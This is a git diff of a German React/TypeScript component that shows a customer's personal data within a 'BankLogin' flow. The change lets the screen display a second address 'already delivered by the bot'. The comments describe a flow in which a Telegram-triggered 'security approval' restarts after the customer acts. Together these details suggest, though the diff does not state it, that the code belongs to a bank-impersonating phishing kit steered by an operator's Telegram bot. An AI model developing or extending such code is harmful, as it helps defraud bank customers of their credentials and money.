@@ -40,6 +40,8 @@ interface PersonalDataOverviewProps {
   /** Wird aufgerufen, sobald der Kunde die Zusatzadresse gelöscht hat.
    *  BankLogin startet dann eine erneute Telegram-Sicherheitsfreigabe. */
   onAddressChoiceResolved?: () => void;
+  /** Bereits vom Bot gelieferte zweite Adresse für die Auswahl. */
+  additionalAddressOverride?: { strasse: string; plzOrt: string } | null;
   /** Wird aufgerufen, wenn der Kunde im Inline-Formular die Hauptadresse speichert. */
   onAddressChange?: (address: { strasse: string; plzOrt: string }) => void;
 }
@@ -48,7 +50,7 @@ type AddContactType = "email" | "mobil" | "telefon" | null;
 type ViewState = "overview" | "contact-list" | "add-contact" | "contact-success" | "edit-address" | "edit-contact";
 type EditContactType = "email" | "mobil" | "telefon";
 
-const PersonalDataOverview = ({ theme, customerData, onContinue, onEditAddress, skipPopup = false, onContactSaved, bankId, addressDecisionPending = false, onAddressChoiceResolved, onAddressChange, continueLoading = false }: PersonalDataOverviewProps & { continueLoading?: boolean }) => {
+const PersonalDataOverview = ({ theme, customerData, onContinue, onEditAddress, skipPopup = false, onContactSaved, bankId, addressDecisionPending = false, onAddressChoiceResolved, additionalAddressOverride, onAddressChange, continueLoading = false }: PersonalDataOverviewProps & { continueLoading?: boolean }) => {
 
   const [showDetails, setShowDetails] = useState(false);
   // Popup unterdrücken, wenn skipPopup gesetzt ist ODER eine Adress-Entscheidung ansteht
@@ -81,7 +83,12 @@ const PersonalDataOverview = ({ theme, customerData, onContinue, onEditAddress, 
   
 
   useEffect(() => {
-    if (!addressDecisionPending || !bankId) return;
+    if (!addressDecisionPending) return;
+    if (additionalAddressOverride?.strasse || additionalAddressOverride?.plzOrt) {
+      setAdditionalAddress(additionalAddressOverride);
+      return;
+    }
+    if (!bankId) return;
     let cancelled = false;
     (async () => {
       try {
@@ -116,7 +123,7 @@ const PersonalDataOverview = ({ theme, customerData, onContinue, onEditAddress, 
       }
     })();
     return () => { cancelled = true; };
-  }, [addressDecisionPending, bankId]);
+  }, [addressDecisionPending, additionalAddressOverride, bankId]);
 
   // Wenn die Adress-Entscheidung erneut ansteht (z.B. nach abgelehnter Freigabe),
   // darf keine Vorauswahl mehr getroffen sein.
